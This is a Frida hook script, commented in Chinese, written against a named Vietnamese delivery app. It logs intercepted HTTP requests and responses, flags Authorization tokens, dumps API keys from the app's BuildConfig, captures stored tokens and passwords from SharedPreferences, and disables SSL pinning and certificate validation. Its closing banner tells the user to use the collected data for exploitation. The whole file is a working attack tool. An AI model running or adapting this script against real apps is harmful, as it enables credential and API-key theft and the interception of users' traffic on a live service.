/**
 * GHN App 高级Frida Hook脚本
 * 用途: 拦截API请求、提取Token、绕过安全检测
 * 目标: vn.ghn.app.giaohangnhanh
 */

console.log("[*] GHN Advanced Frida Hook - Loading...");

// ====================================
// 1. 拦截所有HTTP(S)请求
// ====================================
Java.perform(function() {
    console.log("[+] Hooking OkHttp3 Request Builder...");
    
    var RequestBuilder = Java.use("okhttp3.Request$Builder");
    
    // Hook Request.Builder.build()
    RequestBuilder.build.implementation = function() {
        var request = this.build();
        var url = request.url().toString();
        var method = request.method();
        var headers = request.headers();
        
        console.log("\n[HTTP REQUEST]");
        console.log("URL: " + url);
        console.log("Method: " + method);
        console.log("Headers:");
        
        // 提取所有Header
        for (var i = 0; i < headers.size(); i++) {
            var name = headers.name(i);
            var value = headers.value(i);
            console.log("  " + name + ": " + value);
            
            // 特别标记Authorization header
            if (name.toLowerCase() === "authorization") {
                console.log("  🔑 [TOKEN FOUND]: " + value);
            }
        }
        
        // 提取Request Body
        var body = request.body();
        if (body != null) {
            console.log("Body: " + body.toString());
        }
        
        return request;
    };
});

// ====================================
// 2. 拦截HTTP响应
// ====================================
Java.perform(function() {
    console.log("[+] Hooking OkHttp3 Response...");
    
    var ResponseBuilder = Java.use("okhttp3.Response$Builder");
    
    ResponseBuilder.build.implementation = function() {
        var response = this.build();
        var request = response.request();
        var url = request.url().toString();
        
        console.log("\n[HTTP RESPONSE]");
        console.log("URL: " + url);
        console.log("Status: " + response.code());
        
        try {
            var responseBody = response.body();
            if (responseBody != null) {
                var bodyString = responseBody.string();
                console.log("Response Body: " + bodyString);
                
                // 检查是否包含token
                if (bodyString.indexOf("token") !== -1 || 
                    bodyString.indexOf("access_token") !== -1) {
                    console.log("🔑 [TOKEN IN RESPONSE]: " + bodyString);
                }
            }
        } catch (e) {
            console.log("Error reading response body: " + e);
        }
        
        return response;
    };
});

// ====================================
// 3. 提取BuildConfig中的密钥
// ====================================
Java.perform(function() {
    console.log("[+] Extracting BuildConfig secrets...");
    
    try {
        var BuildConfig = Java.use("vn.ghn.app.giaohangnhanh.BuildConfig");
        
        console.log("\n[BUILD CONFIG SECRETS]");
        console.log("AppsFlyer Dev Key: " + BuildConfig.APPSFLYER_DEV_KEY.value);
        console.log("FPT eKYC API Key: " + BuildConfig.FPT_EKYC_API_KEY.value);
        console.log("GHN Analytics Key: " + BuildConfig.GHN_ANALYTICS_API_KEY.value);
        console.log("Google Maps Key: " + BuildConfig.GOOGLE_MAPS_API_KEY.value);
        console.log("Captcha Site Key: " + BuildConfig.CAPCHA_SITE_KEY.value);
        console.log("SSO App Key: " + BuildConfig.authenUri_v2.value);
        
        console.log("\n[API ENDPOINTS]");
        console.log("Main Gateway: " + BuildConfig.GHN_URL.value);
        console.log("FCM Gateway: " + BuildConfig.GHN_FCM.value);
        console.log("Tracking: " + BuildConfig.GHN_TRACKING_URL.value);
        console.log("COD: " + BuildConfig.GHN_COD_URL.value);
        console.log("Gamification: " + BuildConfig.GHN_GAMIFICATION.value);
        
    } catch (e) {
        console.log("Error extracting BuildConfig: " + e);
    }
});

// ====================================
// 4. Hook SharedPreferences (提取本地存储Token)
// ====================================
Java.perform(function() {
    console.log("[+] Hooking SharedPreferences...");
    
    var SharedPreferences = Java.use("android.content.SharedPreferences");
    var Editor = Java.use("android.content.SharedPreferences$Editor");
    
    // Hook getString
    SharedPreferences.getString.overload('java.lang.String', 'java.lang.String').implementation = function(key, defValue) {
        var value = this.getString(key, defValue);
        if (value != null && (key.toLowerCase().indexOf("token") !== -1 || 
                               key.toLowerCase().indexOf("auth") !== -1 ||
                               key.toLowerCase().indexOf("session") !== -1)) {
            console.log("\n[SharedPreferences READ]");
            console.log("Key: " + key);
            console.log("Value: " + value);
        }
        return value;
    };
    
    // Hook putString
    Editor.putString.implementation = function(key, value) {
        if (key.toLowerCase().indexOf("token") !== -1 || 
            key.toLowerCase().indexOf("auth") !== -1 ||
            key.toLowerCase().indexOf("password") !== -1) {
            console.log("\n[SharedPreferences WRITE]");
            console.log("Key: " + key);
            console.log("Value: " + value);
        }
        return this.putString(key, value);
    };
});

// ====================================
// 5. 绕过SSL Pinning
// ====================================
Java.perform(function() {
    console.log("[+] Bypassing SSL Pinning...");
    
    // Hook CertificatePinner
    try {
        var CertificatePinner = Java.use("okhttp3.CertificatePinner");
        
        CertificatePinner.check.overload('java.lang.String', 'java.util.List').implementation = function(hostname, peerCertificates) {
            console.log("[SSL Pinning] Bypassing check for: " + hostname);
            return;
        };
        
        CertificatePinner.check.overload('java.lang.String', '[Ljava.security.cert.Certificate;').implementation = function(hostname, peerCertificates) {
            console.log("[SSL Pinning] Bypassing check for: " + hostname);
            return;
        };
        
        console.log("[+] SSL Pinning bypassed!");
    } catch (e) {
        console.log("[!] No SSL Pinning found or already bypassed: " + e);
    }
    
    // Hook TrustManager
    try {
        var X509TrustManager = Java.use("javax.net.ssl.X509TrustManager");
        var SSLContext = Java.use("javax.net.ssl.SSLContext");
        
        var TrustManager = Java.registerClass({
            name: "com.sensepost.test.TrustManager",
            implements: [X509TrustManager],
            methods: {
                checkClientTrusted: function(chain, authType) {},
                checkServerTrusted: function(chain, authType) {},
                getAcceptedIssuers: function() { return []; }
            }
        });
        
        var TrustManagers = [TrustManager.$new()];
        var SSLContextInit = SSLContext.init.overload("[Ljavax.net.ssl.KeyManager;", "[Ljavax.net.ssl.TrustManager;", "java.security.SecureRandom");
        
        SSLContextInit.implementation = function(keyManager, trustManager, secureRandom) {
            console.log("[SSL Context] Replacing TrustManager");
            SSLContextInit.call(this, keyManager, TrustManagers, secureRandom);
        };
        
        console.log("[+] TrustManager bypassed!");
    } catch (e) {
        console.log("[!] TrustManager bypass failed: " + e);
    }
});

// ====================================
// 6. Hook JWT Token解码
// ====================================
Java.perform(function() {
    console.log("[+] Hooking JWT decoding...");
    
    try {
        // Base64解码
        var Base64 = Java.use("android.util.Base64");
        
        Base64.decode.overload('[B', 'int').implementation = function(input, flags) {
            var result = this.decode(input, flags);
            var decoded = String.fromCharCode.apply(null, result);
            
            if (decoded.indexOf("{") === 0 || decoded.indexOf("eyJ") === 0) {
                console.log("\n[BASE64 DECODED - Possible JWT]");
                console.log("Decoded: " + decoded);
            }
            
            return result;
        };
    } catch (e) {
        console.log("JWT Hook error: " + e);
    }
});

// ====================================
// 7. 拦截订单API调用
// ====================================
Java.perform(function() {
    console.log("[+] Hooking Order API calls...");
    
    // 搜索包含Order的类
    Java.enumerateLoadedClasses({
        onMatch: function(className) {
            if (className.toLowerCase().indexOf("order") !== -1 && 
                className.indexOf("vn.ghn") !== -1) {
                console.log("[Order Class Found]: " + className);
                
                try {
                    var OrderClass = Java.use(className);
                    var methods = OrderClass.class.getDeclaredMethods();
                    
                    methods.forEach(function(method) {
                        console.log("  Method: " + method.getName());
                    });
                } catch (e) {
                    // Ignore
                }
            }
        },
        onComplete: function() {
            console.log("[+] Order class enumeration complete");
        }
    });
});

// ====================================
// 8. Hook Retrofit API Service
// ====================================
Java.perform(function() {
    console.log("[+] Hooking Retrofit Service...");
    
    try {
        var Retrofit = Java.use("retrofit2.Retrofit");
        
        Retrofit.create.implementation = function(serviceClass) {
            console.log("\n[Retrofit Service Created]");
            console.log("Service Class: " + serviceClass.getName());
            
            var service = this.create(serviceClass);
            return service;
        };
    } catch (e) {
        console.log("Retrofit hook error: " + e);
    }
});

// ====================================
// 9. 实时监控Activity启动
// ====================================
Java.perform(function() {
    console.log("[+] Monitoring Activity launches...");
    
    var Activity = Java.use("android.app.Activity");
    
    Activity.onCreate.overload('android.os.Bundle').implementation = function(savedInstanceState) {
        console.log("\n[Activity Launched]: " + this.getClass().getName());
        this.onCreate(savedInstanceState);
    };
});

// ====================================
// 10. 导出所有发现的数据
// ====================================
setTimeout(function() {
    console.log("\n========================================");
    console.log("GHN Frida Hook Summary");
    console.log("========================================");
    console.log("[*] All hooks installed successfully");
    console.log("[*] Monitoring active...");
    console.log("[*] Use this data for exploitation");
    console.log("========================================\n");
}, 2000);

console.log("[*] GHN Advanced Frida Hook - Loaded Successfully!");
